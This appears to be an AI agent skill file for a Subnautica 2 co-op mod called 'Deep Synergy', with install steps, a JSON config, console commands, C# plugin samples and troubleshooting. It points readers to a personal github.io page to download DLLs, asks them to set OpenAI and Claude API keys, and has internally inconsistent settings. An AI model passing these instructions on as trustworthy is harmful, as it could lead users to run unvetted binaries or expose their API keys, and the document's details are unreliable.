---
name: subnautica-ii-coop-deepsynergy-mod
description: Multiplayer co-op mod for Subnautica 2 using BepInEx with synchronized sessions, shared inventories, and adaptive difficulty scaling
triggers:
  - how do I install the Subnautica 2 multiplayer mod
  - configure Deep Synergy co-op mod for Subnautica
  - set up BepInEx plugin for Subnautica 2 multiplayer
  - troubleshoot Subnautica 2 co-op session sync issues
  - create multiplayer session in Subnautica 2 mod
  - adjust difficulty scaling for Subnautica co-op
  - fix Deep Synergy mod connection problems
  - configure shared inventory settings for Subnautica multiplayer
---

# Subnautica II Co-op Deep Synergy Mod

> Skill by [ara.so](https://ara.so) — Devtools Skills collection.

## What It Does

The Deep Synergy Multiplayer Mod transforms Subnautica 2 into a synchronized cooperative experience. Built on BepInEx, it provides:

- **Deterministic Session Synchronization (DSS)**: Conflict-resolved shared world state across clients
- **Adaptive Dynamic Scaling (ADS)**: Auto-adjusts creature spawns and resource respawn based on player count
- **Shared Inventory System**: Merkle tree-based inventory tracking with peer verification
- **Decentralized P2P Networking**: WebRTC-based multiplayer without central servers
- **Cross-Platform Support**: Windows, Linux (Steam Deck), macOS compatibility

The mod operates as a BepInEx plugin that hooks into Subnautica 2's Unity runtime at the IL2CPP level without modifying game files.

## Installation

### Prerequisites

1. **Subnautica 2** installed via Steam/GOG
2. **BepInEx 6.0.x** for Unity IL2CPP games

### Steps

```bash
# 1. Install BepInEx 6.0.x for Subnautica 2
# Download from https://github.com/BepInEx/BepInEx/releases
# Extract to Subnautica 2 game directory

# 2. Download Deep Synergy Mod
# Visit: https://maglin-jenebellah.github.io

# 3. Extract mod files to BepInEx plugins directory
# <Game_Directory>/BepInEx/plugins/DeepSynergyMod/

# 4. Verify directory structure
<Subnautica2_Root>/
├── BepInEx/
│   ├── plugins/
│   │   └── DeepSynergyMod/
│   │       ├── DeepSynergy.dll
│   │       ├── SyncEngine.dll
│   │       └── NetworkLayer.dll
│   └── config/
│       └── synergy_profile.json
```

### First Launch

```bash
# Launch Subnautica 2 through Steam/GOG
# BepInEx will initialize and load the mod
# Check BepInEx/LogOutput.log for successful plugin loading

# Expected log output:
[Info   :   BepInEx] Loading [Deep Synergy Multiplayer Mod 1.0.0]
[Info   : DeepSynergy] Session Manager initialized
[Info   : DeepSynergy] WebRTC layer ready
```

## Configuration

### Profile Configuration File

Create or edit `BepInEx/config/synergy_profile.json`:

```json
{
  "session_name": "Ocean Explorers",
  "max_players": 4,
  "difficulty_scale": "adaptive",
  "resource_multiplier": 1.0,
  "oxygen_consumption": 1.0,
  "creature_spawn_divider": 1,
  "enable_pvp": false,
  "friendly_fire": false,
  "shared_blueprints": true,
  "ping_locations_shared": true,
  "time_of_day_sync": "host",
  "voice_chat_integration": "none",
  "locale": "en-US",
  "api_integration": {
    "openai": {
      "enabled": false,
      "role": "narrator",
      "api_key_env": "OPENAI_API_KEY"
    },
    "claude": {
      "enabled": false,
      "role": "lore_engine",
      "api_key_env": "CLAUDE_API_KEY"
    }
  },
  "network": {
    "port": 7777,
    "nat_punchthrough": true,
    "max_latency_ms": 250,
    "sync_interval_ms": 100
  }
}
```

### Configuration Fields

| Field | Type | Description |
|-------|------|-------------|
| `session_name` | string | Display name for multiplayer session |
| `max_players` | int | 2-8, maximum concurrent players |
| `difficulty_scale` | string | `"fixed"`, `"adaptive"`, `"hardcore"` |
| `resource_multiplier` | float | Multiplies harvestable resource nodes (0.5-3.0) |
| `oxygen_consumption` | float | Modifies oxygen drain rate (0.5-2.0) |
| `creature_spawn_divider` | int | Divides creature spawn count (1-4) |
| `shared_blueprints` | bool | Share blueprint unlocks across all players |
| `time_of_day_sync` | string | `"host"`, `"all"`, `"independent"` |

## Console Commands

Access via BepInEx console (F5 by default):

```bash
# Session Management
/start_server                           # Host a new session
/join_session <CODE>                    # Join existing session
/disconnect                             # Leave current session
/session_info                           # Display session details

# Synchronization
/synergy_status                         # Connection status, latency, sync progress
/force_sync                             # Manually trigger state synchronization
/inventory_verify                       # Verify inventory hash across peers

# Configuration
/synergy_scale <MULTIPLIER>             # Adjust difficulty scaling (0.5-3.0)
/resource_refresh                       # Force resource node respawn
/creature_reset                         # Reset creature AI states

# Advanced
/seed_override <SEED>                   # Set world seed for all clients
/debug_network                          # Enable network packet logging
/api_narrate "<EVENT>"                  # Trigger AI narrative generation

# Example Session Creation
> /start_server
[DeepSynergy] Starting host session...
[DeepSynergy] Session code: 9B2A-4C7D-E8F1
[DeepSynergy] Listening on port 7777
[DeepSynergy] NAT traversal: ENABLED

# Example Join
> /join_session 9B2A-4C7D-E8F1
[DeepSynergy] Connecting to session...
[DeepSynergy] Peer handshake successful
[DeepSynergy] Synchronizing world state (0%)...
[DeepSynergy] Sync complete (100%) - 2 players connected
```

## Code Examples

### Custom Mod Plugin (C# BepInEx)

Extend Deep Synergy functionality with custom plugins:

```csharp
using BepInEx;
using BepInEx.IL2CPP;
using DeepSynergy.API;
using UnityEngine;

namespace CustomSynergyExtension
{
    [BepInPlugin(GUID, NAME, VERSION)]
    [BepInDependency("com.deepsynergy.core")]
    public class CustomSyncPlugin : BasePlugin
    {
        const string GUID = "com.custom.synergyplugin";
        const string NAME = "Custom Synergy Extension";
        const string VERSION = "1.0.0";

        private ISynergySessionManager sessionManager;
        private ISynergyStateSync stateSync;

        public override void Load()
        {
            // Get Deep Synergy API references
            sessionManager = DeepSynergyAPI.GetSessionManager();
            stateSync = DeepSynergyAPI.GetStateSync();

            // Subscribe to session events
            sessionManager.OnPlayerJoined += OnPlayerJoined;
            sessionManager.OnPlayerLeft += OnPlayerLeft;

            // Register custom state synchronization
            stateSync.RegisterCustomState("custom_data", SyncCustomData);

            Log.LogInfo($"{NAME} loaded successfully");
        }

        private void OnPlayerJoined(PlayerInfo player)
        {
            Log.LogInfo($"Player joined: {player.Username} (ID: {player.PeerID})");
            
            // Send welcome message to all players
            sessionManager.BroadcastMessage($"{player.Username} joined the session");
        }

        private void OnPlayerLeft(PlayerInfo player)
        {
            Log.LogInfo($"Player left: {player.Username}");
        }

        private byte[] SyncCustomData()
        {
            // Serialize custom game state data
            var customData = new CustomGameData
            {
                timestamp = Time.time,
                customValue = 42
            };
            
            return MessagePackSerializer.Serialize(customData);
        }
    }

    public struct CustomGameData
    {
        public float timestamp;
        public int customValue;
    }
}
```

### Programmatic Session Control

```csharp
using DeepSynergy.API;
using System.Threading.Tasks;

public class SessionController
{
    private ISynergySessionManager sessionManager;
    private SessionConfig config;

    public async Task<string> CreateCustomSession()
    {
        // Load configuration
        config = new SessionConfig
        {
            SessionName = "Custom Session",
            MaxPlayers = 4,
            DifficultyScale = DifficultyScaleMode.Adaptive,
            ResourceMultiplier = 1.5f,
            SharedBlueprints = true,
            NetworkConfig = new NetworkConfig
            {
                Port = 7777,
                MaxLatency = 250,
                SyncInterval = 100
            }
        };

        // Initialize session
        sessionManager = DeepSynergyAPI.GetSessionManager();
        string sessionCode = await sessionManager.CreateSessionAsync(config);

        // Register event handlers
        sessionManager.OnStateConflict += HandleStateConflict;
        sessionManager.OnSyncCompleted += OnSyncCompleted;

        return sessionCode;
    }

    private void HandleStateConflict(StateConflictEvent evt)
    {
        // Custom conflict resolution logic
        if (evt.ConflictType == ConflictType.InventoryDesync)
        {
            // Use timestamp authority
            evt.ResolveWithTimestamp();
        }
        else if (evt.ConflictType == ConflictType.BaseStructure)
        {
            // Use host authority
            evt.ResolveWithHostAuthority();
        }
    }

    private void OnSyncCompleted(SyncCompletedEvent evt)
    {
        Logger.LogInfo($"Sync complete: {evt.ItemsSynced} items, {evt.DurationMs}ms");
    }
}
```

### Inventory Synchronization Hook

```csharp
using DeepSynergy.Inventory;
using Subnautica.Items;

public class InventorySyncHook
{
    private IInventorySync inventorySync;

    public void Initialize()
    {
        inventorySync = DeepSynergyAPI.GetInventorySync();

        // Hook into game inventory events
        InventoryController.OnItemAdded += OnItemAdded;
        InventoryController.OnItemRemoved += OnItemRemoved;
    }

    private void OnItemAdded(Item item, int quantity)
    {
        // Synchronize item addition across all clients
        var syncData = new InventoryChangeData
        {
            ItemID = item.ID,
            Quantity = quantity,
            Action = InventoryAction.Add,
            Timestamp = NetworkTime.GetTimestamp()
        };

        inventorySync.BroadcastInventoryChange(syncData);
    }

    private void OnItemRemoved(Item item, int quantity)
    {
        var syncData = new InventoryChangeData
        {
            ItemID = item.ID,
            Quantity = quantity,
            Action = InventoryAction.Remove,
            Timestamp = NetworkTime.GetTimestamp()
        };

        inventorySync.BroadcastInventoryChange(syncData);
    }
}
```

## Common Patterns

### Pattern 1: Adaptive Difficulty Scaling

```json
{
  "difficulty_scale": "adaptive",
  "resource_multiplier": 1.2,
  "creature_spawn_divider": 1,
  "oxygen_consumption": 0.9
}
```

With 2 players: Resources +20%, oxygen -10% drain, normal creature spawns
With 4 players: Resources +40%, oxygen -20% drain, creatures ÷2

### Pattern 2: Hardcore Co-op

```json
{
  "difficulty_scale": "hardcore",
  "resource_multiplier": 0.8,
  "creature_spawn_divider": 0.5,
  "oxygen_consumption": 1.5,
  "friendly_fire": true,
  "shared_blueprints": false
}
```

### Pattern 3: Casual Exploration

```json
{
  "difficulty_scale": "fixed",
  "resource_multiplier": 2.0,
  "creature_spawn_divider": 2,
  "oxygen_consumption": 0.5,
  "enable_pvp": false,
  "shared_blueprints": true
}
```

### Pattern 4: AI-Enhanced Narrative

```json
{
  "api_integration": {
    "openai": {
      "enabled": true,
      "role": "narrator",
      "api_key_env": "OPENAI_API_KEY"
    },
    "claude": {
      "enabled": true,
      "role": "lore_engine",
      "api_key_env": "CLAUDE_API_KEY"
    }
  }
}
```

Console usage:
```bash
/api_narrate "discovered alien artifact in lost river"
# Returns: "The artifact pulses with an otherworldly rhythm. Thermal readings suggest it predates the last extinction event..."
```

## Troubleshooting

### Session Connection Fails

**Symptom**: Cannot join session with valid code

```bash
# Check network configuration
/debug_network

# Verify port forwarding (if not using NAT punchthrough)
# Ensure UDP port 7777 is open

# Check firewall rules
# Windows: Allow BepInEx/Subnautica2.exe through Windows Firewall
# Linux: sudo ufw allow 7777/udp
```

**Solution**: Enable NAT punchthrough in config:
```json
{
  "network": {
    "nat_punchthrough": true,
    "port": 7777
  }
}
```

### Inventory Desynchronization

**Symptom**: Items appear/disappear inconsistently between players

```bash
# Force inventory verification
/inventory_verify

# Check output for hash mismatch
[DeepSynergy] Inventory hash: Local=0xFA342B1E, Peer1=0xFA342B1E, Peer2=0x00000000

# Force full state sync
/force_sync
```

**Solution**: Enable stricter sync intervals:
```json
{
  "network": {
    "sync_interval_ms": 50
  }
}
```

### High Latency / Lag

**Symptom**: Actions delayed, creatures rubber-banding

```bash
# Check connection status
/synergy_status

# Output:
Connected peers: 3
Average latency: 450ms (WARNING: High latency)
Packet loss: 8%
```

**Solution**: Reduce max players or increase latency tolerance:
```json
{
  "max_players": 2,
  "network": {
    "max_latency_ms": 500,
    "sync_interval_ms": 200
  }
}
```

### Blueprint Unlock Not Shared

**Symptom**: One player unlocks blueprint, others don't receive it

**Check configuration**:
```json
{
  "shared_blueprints": true
}
```

**Force blueprint sync**:
```bash
/force_sync
```

### Mod Not Loading

**Check BepInEx log** (`BepInEx/LogOutput.log`):

```
[Error  :   BepInEx] Could not load [DeepSynergy.dll]
[Error  :   BepInEx] System.IO.FileNotFoundException: Missing dependency
```

**Solution**: Ensure all mod files are in correct directory:
```
BepInEx/plugins/DeepSynergyMod/
├── DeepSynergy.dll
├── SyncEngine.dll
├── NetworkLayer.dll
└── 0Harmony.dll (BepInEx dependency)
```

### Creature AI Desync

**Symptom**: Leviathans appear in different locations for each player

```bash
# Reset creature AI states
/creature_reset

# Force synchronize all creature positions
/force_sync
```

**Prevention**: Lower creature spawn divider to reduce AI state complexity:
```json
{
  "creature_spawn_divider": 2
}
```

### Session Code Not Generating

**Check console output**:
```bash
> /start_server
[Error] Port 7777 already in use
```

**Solution**: Change port or kill conflicting process:
```json
{
  "network": {
    "port": 7778
  }
}
```

Or on Linux:
```bash
sudo lsof -i :7777
kill <PID>
```

## Environment Variables

For API integrations (optional):

```bash
# OpenAI API key for narrative generation
export OPENAI_API_KEY="sk-proj-..."

# Anthropic Claude API key for lore engine
export CLAUDE_API_KEY="sk-ant-..."
```

Reference in configuration:
```json
{
  "api_integration": {
    "openai": {
      "api_key_env": "OPENAI_API_KEY"
    }
  }
}
```

## Performance Optimization

### For Low-End Systems

```json
{
  "max_players": 2,
  "resource_multiplier": 1.0,
  "creature_spawn_divider": 2,
  "network": {
    "sync_interval_ms": 200,
    "max_latency_ms": 500
  }
}
```

### For High-End Systems / LAN

```json
{
  "max_players": 8,
  "network": {
    "sync_interval_ms": 50,
    "max_latency_ms": 100
  }
}
```

## Key Files

- `BepInEx/config/synergy_profile.json` - Main configuration
- `BepInEx/LogOutput.log` - BepInEx and mod logs
- `BepInEx/plugins/DeepSynergyMod/` - Mod DLL files
- `Subnautica2_Data/Managed/` - Game assemblies (do not modify)

## Resources

- BepInEx Documentation: https://docs.bepinex.dev/
- Subnautica Modding Wiki: https://subnauticamodding.github.io/
- Discord Support: Available 24/7 (see project homepage)
